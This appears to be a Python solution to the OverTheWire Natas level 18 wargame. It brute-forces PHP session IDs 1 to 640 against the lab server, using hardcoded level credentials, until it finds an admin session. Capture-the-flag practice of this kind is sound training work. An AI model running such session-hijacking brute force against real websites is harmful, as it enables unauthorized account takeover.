import requests
from requests.auth import HTTPBasicAuth

Auth=HTTPBasicAuth('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')
gotcha = "You are an admin"

for i in range(1, 641):
    if i % 10 == 0:
        print (f'Checked {str(i)} sessions...')
    exploit = { 'PHPSESSID': str(i)}
    response = requests.get('http://natas18.natas.labs.overthewire.org/index.php', auth=Auth, cookies=exploit)
    if gotcha in response.text:
        print(response.text)
        break